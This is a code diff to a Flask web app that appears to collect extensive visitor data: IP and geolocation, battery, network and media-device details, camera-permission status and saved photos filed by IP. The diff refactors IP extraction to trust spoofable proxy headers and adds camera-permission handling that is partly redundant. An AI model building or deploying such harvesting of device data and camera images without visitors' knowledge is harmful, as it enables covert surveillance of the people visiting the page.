@@ -152,12 +152,29 @@ def index():
     """Serve the main page with the button"""
     return render_template('index.html')
 
+def get_client_ip():
+    """Extract client IP from request, handling proxy headers correctly"""
+    # Check X-Real-IP first (used by some proxies like Render)
+    ip = request.headers.get('X-Real-IP')
+    if ip:
+        return ip.split(',')[0].strip()
+    
+    # Check X-Forwarded-For (can contain multiple IPs, take the first one)
+    ip = request.headers.get('X-Forwarded-For')
+    if ip:
+        # X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
+        # The first IP is the original client IP
+        return ip.split(',')[0].strip()
+    
+    # Fallback to remote_addr
+    return request.remote_addr
+
 @app.route('/api/get-ip-info')
 def get_ip_info():
     """Backend endpoint to fetch IP info (avoids CORS issues)"""
     try:
         # Get client IP from headers (for when behind proxy/load balancer)
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        client_ip = get_client_ip()
 
         # If it's localhost, the IP info services will auto-detect the server's public IP
         # This is expected behavior when testing locally
@@ -213,7 +230,7 @@ def collect_data():
         # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
         # Fall back to request headers if not available
         ip_from_geo = data.get('ipInfo', {}).get('ip')
-        ip_from_request = request.headers.get('X-Forwarded-For', request.remote_addr)
+        ip_from_request = get_client_ip()
         ip_address = ip_from_geo if ip_from_geo else ip_from_request
 
         # Extract data from the payload
@@ -253,12 +270,22 @@ def collect_data():
         battery_info = json.dumps(data.get('batteryInfo', {}))
         network_info = json.dumps(data.get('networkInfo', {}))
         media_devices = json.dumps(data.get('mediaDevices', {}))
-        camera_permission = json.dumps(data.get('cameraAccess', {}))
+        
+        # Ensure camera permission is properly stored
+        camera_access = data.get('cameraAccess', {})
+        # If cameraAccess is empty, try to get it from raw data
+        if not camera_access or not camera_access.get('granted'):
+            # Try to extract from raw data if available
+            raw_payload = data
+            if 'cameraAccess' in raw_payload and raw_payload['cameraAccess']:
+                camera_access = raw_payload['cameraAccess']
+        
+        camera_permission = json.dumps(camera_access)
         user_agent = request.headers.get('User-Agent', '')
         raw_data = json.dumps(data)
 
         # Enhanced logging for camera permission
-        camera_data = data.get('cameraAccess', {})
+        camera_data = camera_access
         print(f"\n{'='*60}")
         print(f"[DATA COLLECTION] New entry at {timestamp}")
         print(f"IP Address: {ip_address}")
@@ -267,6 +294,7 @@ def collect_data():
         print(f"Camera Message: {camera_data.get('message', 'NO MESSAGE')}")
         if camera_data.get('error'):
             print(f"Camera Error: {camera_data.get('error')}")
+        print(f"Camera Permission JSON: {camera_permission}")
         print(f"{'='*60}\n")
 
         # Store in database
@@ -559,7 +587,7 @@ def save_photo():
         if photo_ip:
             client_ip = photo_ip
         else:
-            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            client_ip = get_client_ip()
 
         # Generate unique filename
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
